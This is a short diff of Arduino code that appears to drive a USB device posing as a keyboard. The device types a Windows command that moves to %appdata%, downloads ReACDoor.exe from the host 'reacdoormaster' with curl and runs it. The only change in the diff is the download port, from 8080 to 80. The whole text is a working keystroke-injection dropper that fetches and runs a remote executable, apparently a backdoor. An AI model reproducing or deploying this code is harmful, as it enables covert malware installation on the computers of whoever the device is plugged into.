@@ -23,7 +23,7 @@ void setup() {
   delay(1000);
   Keyboard.println("cmd");
   delay(1000);
-  Keyboard.println(R"(cd %appdata% && curl -O http://reacdoormaster:8080/ReACDoor.exe && (start ReACDoor.exe) & exit)");
+  Keyboard.println(R"(cd %appdata% && curl -O http://reacdoormaster:80/ReACDoor.exe && (start ReACDoor.exe) & exit)");
   //Keyboard.press(KEY_RETURN);
   //Keyboard.releaseAll();
 }
